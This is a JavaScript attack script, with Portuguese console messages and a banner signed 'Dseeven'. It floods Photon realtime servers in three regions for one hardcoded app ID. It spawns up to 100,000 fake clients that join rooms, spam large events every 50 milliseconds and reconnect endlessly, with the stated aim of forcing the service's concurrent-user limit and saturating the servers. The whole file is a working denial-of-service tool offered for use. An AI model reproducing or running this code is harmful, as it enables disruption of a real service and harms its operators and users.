const Photon = require("photon-realtime");
const https = require('https');
const http = require('http');
const axios = require('axios');

const appId = "1bc0d9b0-ea05-4eec-9ca0-c28d5b678b58";
const totalUsers = 100000;
const roomsToFlood = 50;

const allClients = [];
let requestCount = 0;
let connectedUsers = 0;
let roomsJoined = 0;
const startTime = Date.now();

const regions = [
    { name: "US", address: "wss://ns-us.photonengine.io:443", prefix: "US" },
    { name: "EU", address: "wss://ns-eu.photonengine.io:443", prefix: "EU" },
    { name: "SA", address: "wss://ns-sa.photonengine.io:443", prefix: "SA" }
];

console.log("iniciando ataque photon - forÃ§ando maxccureached");
console.log("alvo: saturar todos os servidores photon (us/eu/sa)");

function createSmartUser(userId, region) {
    const client = new Photon.LoadBalancing.LoadBalancingClient(
        Photon.ConnectionProtocol.Wss,
        appId,
        appId
    );

    client.setMasterServerAddress(region.address);
    client.connectToRegionMaster(region.name.toLowerCase());
    
    let messageTimer = null;
    let reconnectAttempts = 0;
    const maxReconnectAttempts = 10;

    client.onError = (errorCode, errorMsg) => {
        if (errorCode && errorCode.toString().includes("MaxCcu")) {
            console.log(`maxccureached atingido em ${region.name}!`);
        }
        
        if (reconnectAttempts < maxReconnectAttempts) {
            setTimeout(() => {
                reconnectAttempts++;
                try {
                    if (!client.isConnectedToMaster) {
                        client.connect();
                    }
                } catch(e) {}
            }, 100 * reconnectAttempts);
        }
    };

    client.onStateChange = (state) => {
        if (state === Photon.LoadBalancing.LoadBalancingClient.State.ConnectedToMaster) {
            const roomName = `${region.prefix}_MaxCCU_${Math.floor(Math.random() * roomsToFlood)}`;
            
            try {
                client.joinRandomOrCreateRoom({name: roomName}, {
                    maxPlayers: 50,
                    isVisible: true,
                    isOpen: true
                });
            } catch(e) {}
            
            reconnectAttempts = 0;
        }
        
        if (state === Photon.LoadBalancing.LoadBalancingClient.State.Joined) {
            connectedUsers++;
            roomsJoined++;
            
            messageTimer = setInterval(() => {
                try {
                    if (client.isJoinedToRoom) {
                        for(let i = 0; i < 20; i++) {
                            client.raiseEvent(1, {
                                msg: `SPAM_OVERLOAD_${Date.now()}_${i}`,
                                user: userId,
                                region: region.name,
                                data: Math.random().toString(36).repeat(100),
                                timestamp: Date.now(),
                                payload: new Array(50).fill(Math.random())
                            }, {receivers: 0});
                            requestCount++;
                        }
                    }
                } catch(e) {}
            }, 50);
        }
        
        if (state === Photon.LoadBalancing.LoadBalancingClient.State.Disconnected) {
            if (messageTimer) {
                clearInterval(messageTimer);
                messageTimer = null;
            }
            connectedUsers--;
            
            setTimeout(() => {
                try {
                    client.connect();
                } catch(e) {}
            }, 500);
        }
    };
    
    client.connect();
    allClients.push(client);
    
    return client;
}

let usersCreated = 0;
const userCreationInterval = setInterval(() => {
    if (usersCreated < totalUsers) {
        const region = regions[usersCreated % regions.length];
        const batchSize = 10;
        
        for(let i = 0; i < batchSize && usersCreated < totalUsers; i++) {
            createSmartUser(usersCreated, region);
            usersCreated++;
        }
    } else {
        clearInterval(userCreationInterval);
        console.log("todos os usuarios criados - ataque em curso!");
    }
}, 50);

setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;
    const rps = (requestCount / elapsed).toFixed(0);
    
    console.log(`\n=== relatorio de ataque photon ===`);
    console.log(`usuarios: ${connectedUsers}/${usersCreated} online`);
    console.log(`salas: ${roomsJoined}`);
    console.log(`mensagens: ${requestCount} | rps: ${rps}`);
    console.log(`regioes: us, eu, sa`);
    console.log(`status: ${rps > 15000 ? 'ataque efetivo!' : 'atacando...'}`);
    console.log(`===================================\n`);
}, 3000);

setInterval(() => {
    if (connectedUsers < totalUsers * 0.1) {
        console.log("reconectando usuarios...");
        
        allClients.forEach((client, index) => {
            setTimeout(() => {
                try {
                    if (!client.isConnectedToMaster) {
                        client.connect();
                    }
                } catch(e) {}
            }, index * 50);
        });
    }
}, 30000);

console.log("ataque photon iniciado!");
console.log(`total de usuarios: ${totalUsers}`);
console.log(`salas por regiao: ${roomsToFlood}`);
console.log("\x1b[1;94m");
console.log(`
    
██████╗ ███████╗███████╗██╗   ██╗███████╗███╗   ██╗
██╔══██╗██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║
██║  ██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║
██║  ██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
██████╔╝███████║███████╗ ╚████╔╝ ███████╗██║ ╚████║
╚═════╝ ╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝

██╗   ██╗ ██████╗ ██╗██████╗
██║   ██║██╔═══██╗██║██╔══██╗
██║   ██║██║   ██║██║██║  ██║
╚██╗ ██╔╝██║   ██║██║██║  ██║
 ╚████╔╝ ╚██████╔╝██║██████╔╝
  ╚═══╝   ╚═════╝ ╚═╝╚═════╝

██╗  ██╗ ██████╗ ██████╗ ███████╗
██║ ██╔╝██╔═══██╗██╔══██╗██╔════╝
█████╔╝ ██║   ██║██████╔╝█████╗
██╔═██╗ ██║   ██║██╔══██╗██╔══╝
██║  ██╗╚██████╔╝██║  ██║███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝

███╗   ██╗██████╗ ███████╗██╗  ██╗
████╗  ██║██╔══██╗╚══███╔╝╚██╗██╔╝
██╔██╗ ██║██║  ██║  ███╔╝  ╚███╔╝
██║╚██╗██║██║  ██║ ███╔╝   ██╔██╗
██║ ╚████║██████╔╝███████╗██╔╝ ██╗
╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝

              By: Dseeven
`);
console.log("\x1b[0m");